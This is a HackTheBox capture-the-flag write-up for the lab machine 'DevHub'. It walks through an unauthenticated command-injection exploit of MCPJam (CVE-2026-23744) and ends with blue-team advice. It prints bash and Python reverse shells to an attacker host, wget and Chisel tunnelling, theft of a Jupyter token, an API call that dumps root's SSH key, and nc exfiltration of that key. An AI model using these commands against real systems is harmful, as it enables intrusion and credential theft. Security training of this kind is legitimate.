---
title: "HackTheBox — DevHub (Linux / Medium)"
date: 2026-08-07 02:10:00 +0530
categories: [CTF, HackTheBox]
tags: [linux, cve-2026-23744, mcpjam, rce, chisel, tunneling, jupyter, token-hijacking, flask, api-abuse, ssh-key-theft, privilege-escalation, python]
author: Prince_kumar
math: false
mermaid: false
---

> **When an internal development platform exposes its MCP server to exploitation and hidden API endpoints hand over root's SSH key.**  
> This is the story of DevHub — a medium-difficulty Linux machine that chains a public CVE for remote code execution, Chisel tunneling into internal services, Jupyter token hijacking, and hidden administrative endpoint abuse to achieve full root compromise.

---

## Challenge Info

| Field        | Value                        |
|--------------|------------------------------|
| Platform     | HackTheBox                   |
| Box Name     | DevHub                       |
| OS           | Linux                        |
| Difficulty   | Medium                       |
| Techniques   | CVE-2026-23744 (MCPJam unauthenticated RCE), Chisel reverse tunneling, Jupyter token hijacking, Hidden API endpoint abuse, SSH key theft |
| Tools Used   | nmap, curl, chisel, netcat, python3, ssh |

---

## 🕚 11:00 — Reconnaissance & Enumeration

Our target IP is `<TARGET_IP>`. We begin with a service-scanning `nmap` execution:

```bash
$ nmap -sC -sV -oN nmap.txt <TARGET_IP>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    nginx
```

Only SSH (port 22) and HTTP (port 80) are listening. The HTTP service redirects to `http://devhub.htb`. Add this hostname to `/etc/hosts`:

```bash
$ echo "<TARGET_IP> devhub.htb" | sudo tee -a /etc/hosts
```

### Landing Page Enumeration

Visiting `http://devhub.htb` reveals an **Internal Development & Analytics Platform**. The page mentions **port 6274**, hinting at an additional service.

Navigating to `http://devhub.htb:6274/` shows an **MCPJam server** instance.  
Checking the settings page (`/settings`) discloses the exact version: **MCPJam v1.4.2**.

---

## 🕦 11:30 — Initial Access: CVE-2026-23744 (Unauthenticated RCE)

### CVE Research

Searching for CVEs associated with MCPJam 1.4.2 leads to **CVE-2026-23744** ([GHSA-232v-j27c-5pp6](https://github.com/advisories/GHSA-232v-j27c-5pp6)). This vulnerability allows **remote code execution** via the `/api/mcp/connect` endpoint. The endpoint accepts a `serverConfig` object with a `command` field that is executed unsanitized.

### Exploitation

Set up a netcat listener on the attack machine:

```bash
$ nc -lvnp 4444
```

Craft a `curl` request to trigger a reverse shell:

```bash
$ curl http://devhub.htb:6274/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"],
      "env": {}
    },
    "serverId": "revshell"
  }'
```

A reverse shell is caught as user **mcp-dev** (uid=1001).

---

## 🕛 12:00 — Internal Enumeration

Once on the target, enumerate listening services:

```bash
mcp-dev@devhub:~$ netstat -tulpn 2>/dev/null || ss -tulpn
```

**Notable localhost-bound services:**
- **127.0.0.1:5000** — Flask/Python API (from `/opt/opsmcp/server.py`)
- **127.0.0.1:8888** — JupyterLab Notebook

Both are only accessible locally, so tunneling is required.

---

## 🕧 12:30 — Lateral Movement: Jupyter Notebook via Chisel

### Setting Up the Chisel Tunnel

**On attacker** (server):

```bash
$ ./chisel server --reverse --port 9001
```

**On target** (upload Chisel binary or download directly):

```bash
mcp-dev@devhub:~$ cd /tmp
mcp-dev@devhub:/tmp$ wget http://<ATTACKER_IP>:8000/chisel -O chisel
mcp-dev@devhub:/tmp$ chmod +x chisel
mcp-dev@devhub:/tmp$ ./chisel client <ATTACKER_IP>:9001 R:8888:127.0.0.1:8888 &
```

Now port 8888 on the target is forwarded to your attacker's `localhost:8888`.

### Extracting the Jupyter Token

The Jupyter server requires a token for authentication. Retrieve it from the process list:

```bash
mcp-dev@devhub:~$ ps aux | grep jupyter
analyst ... --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 ...
```

### Accessing JupyterLab

Open a browser and navigate to:

```
http://localhost:8888/?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

### Code Execution as `analyst`

Jupyter notebooks run as the **analyst** user. Create a new Python 3 notebook and execute a reverse shell payload:

```python
import os, pty, socket
s = socket.socket()
s.connect(('<ATTACKER_IP>', 5555))
[os.dup2(s.fileno(), fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

Start another listener on port 5555:

```bash
$ nc -lvnp 5555
```

Once the cell is executed, you receive a shell as **analyst**.

### User Flag

```bash
analyst@devhub:~$ cat /home/analyst/user.txt
<REDACTED>
```

**User flag captured! 🎉**

---

## 🕐 13:30 — Privilege Escalation: Hidden API Endpoint

### Source Code Analysis

From the earlier enumeration, the Flask API at `/opt/opsmcp/server.py` contains sensitive logic:

```bash
analyst@devhub:~$ cat /opt/opsmcp/server.py
```

Key findings:
- **Hardcoded API key:** `VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"`
- A hidden tool `ops._admin_dump` that dumps sensitive credentials (including SSH keys) when called with `target="ssh_keys"` and `confirm=True`.

### Exploiting the Admin Endpoint

Call the internal API endpoint using `curl` from the analyst shell:

```bash
analyst@devhub:~$ curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
  -H 'Content-Type: application/json' \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

The response contains a JSON object with the `root_private_key` field.

### Extracting the SSH Key

Save the key correctly (converting `\n` literals to actual newlines):

```bash
analyst@devhub:~$ curl -s -X POST ... | python3 -c "import sys,json; print(json.load(sys.stdin)['root_private_key'])" > /tmp/root_key
```

Verify the key:

```bash
analyst@devhub:~$ cat /tmp/root_key
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

### Transfer Key to Attacker

On attacker:

```bash
$ nc -lvnp 6666 > root_key
```

On target:

```bash
analyst@devhub:~$ cat /tmp/root_key | nc <ATTACKER_IP> 6666
```

Set correct permissions:

```bash
$ chmod 600 root_key
```

### SSH as Root

```bash
$ ssh -i root_key root@devhub.htb
```

---

## 🕑 14:00 — Root Flag

```bash
root@devhub:~# cat /root/root.txt
<REDACTED>
```

**Rooted! 🏆**

---

## The Fundamentals Behind the Box

DevHub packages an elegant, multi-staged exploit chain. From unauthenticated RCE via a public CVE through tunneling and token hijacking to hidden administrative endpoint abuse, the box requires understanding of modern development infrastructure and how it can be weaponized.

This section breaks down the core fundamental mechanisms that make each step of the DevHub challenge possible.

### 1. Version Disclosure → CVE Research

The MCPJam server at port 6274 openly disclosed its version (`v1.4.2`) on the settings page. Mapping software versions to public vulnerabilities is the fastest path to initial access.

**Fundamental lesson:** Always fingerprint software versions. Public CVE databases and GitHub Security Advisories are your first stop after version discovery.

### 2. Unauthenticated Command Injection (CVE-2026-23744)

The `/api/mcp/connect` endpoint accepted a `serverConfig` object with an unsanitized `command` field that was passed directly to a shell. This is a textbook command injection — user input flowing into `system()` or `exec()` without validation.

**Fundamental lesson:** Never pass unsanitized input to shell commands. MCP-like protocols that accept server configurations must validate and whitelist allowed commands.

### 3. Localhost Port Forwarding (Chisel)

Internal services (Jupyter on 8888, Flask on 5000) were bound to `127.0.0.1` only. Chisel reverse tunneling allowed us to access these services from our attacker machine as if they were local.

**Fundamental lesson:** Chisel is an essential pivoting tool. When you see services on `127.0.0.1`, tunneling is required — and often reveals the most interesting attack surface.

### 4. Process Enumeration to Steal Secrets

The Jupyter authentication token was visible in `ps aux` output. Tokens, passwords, and arguments are often exposed in process listings.

**Fundamental lesson:** Always check running processes after gaining a foothold. Sensitive arguments (tokens, keys, connection strings) are frequently passed on the command line.

### 5. Jupyter Notebook Abuse

Once we had the token, JupyterLab provided an interactive code execution environment running as the `analyst` user. Notebooks are full-featured Python environments — perfect for spawning reverse shells.

**Fundamental lesson:** Jupyter notebooks are code execution platforms. Local access + token retrieval = shell as the notebook user.

### 6. Hidden Administrative Endpoints & Hardcoded Credentials

The Flask API at `/opt/opsmcp/server.py` contained a hardcoded API key and a hidden `ops._admin_dump` tool that dumped root's SSH private key. This is a common anti-pattern in internal tools.

**Fundamental lesson:** Always read custom application source code. Hidden admin functions, hardcoded credentials, and debug endpoints are frequently tucked away in local scripts.

### 7. SSH Key Theft & Proper Key Formatting

Root's private key was extracted via JSON API response. Proper formatting (converting `\n` literals to actual newlines) was essential to make the key usable.

**Fundamental lesson:** Root SSH keys often exist as recovery mechanisms. Learn to properly extract and format keys from JSON or other structured responses.

---

## Summary of Fundamentals

| Technique | Why It Matters |
|-----------|----------------|
| CVE research based on version strings | Always fingerprint software versions; map them to public vulnerabilities for easy initial access |
| Reverse shell payloads | Understand variations (bash `/dev/tcp`, Python, netcat) — not all targets have bash compiled with `/dev/tcp` |
| Localhost port forwarding (Chisel) | Essential for reaching services only listening on `127.0.0.1` — a must-know pivot tool |
| Process enumeration to steal secrets | Tokens, passwords, and arguments are often visible in `ps aux` |
| Reading custom application source code | Hidden admin functions, hardcoded credentials, and debug endpoints are frequently tucked away in local scripts |
| SSH key theft | Root keys often exist as recovery mechanisms; learn to properly format keys when extracting from JSON |
| Jupyter notebook abuse | Once you have local access, retrieving the token is trivial, and notebooks provide interactive code execution as another user |

---

## Vulnerability Summary

| Stage | Vulnerability / Misconfiguration | Impact |
|-------|----------------------------------|--------|
| **Foothold** | CVE-2026-23744 (MCPJam unauthenticated command injection) | RCE as `mcp-dev` |
| **Lateral Move** | Jupyter token leaked in process arguments | Code execution as `analyst` |
| **Escalation** | Hardcoded API key + hidden `ops._admin_dump` endpoint | Root SSH key extraction |

---

## Key Takeaways

1. **Inspect version disclosures carefully:** The MCPJam settings page openly revealed the vulnerable version, leading directly to a public CVE with RCE.
2. **Chisel is indispensable for pivoting:** Internal-only services are a common pattern — master reverse tunneling to access them.
3. **Process arguments leak secrets:** Jupyter tokens, database passwords, and API keys regularly appear in `ps aux` output.
4. **Custom APIs hide dangerous tools:** Hardcoded credentials and undocumented administrative endpoints are a recurring pattern in internal development platforms.

---

## Blue Team Perspective

- **Validate all inputs** in MCP-like protocols — never pass unsanitized commands to a shell.
- **Use network segmentation** — Jupyter and internal APIs should not be reachable even after initial compromise.
- **Avoid hardcoded secrets** — use environment variables or a proper secrets manager.
- **Minimise localhost-only services** — employ proper authentication, and consider using Unix sockets with file permissions.
- **Rotate SSH keys** — never leave root recovery keys accessible behind a single API call.
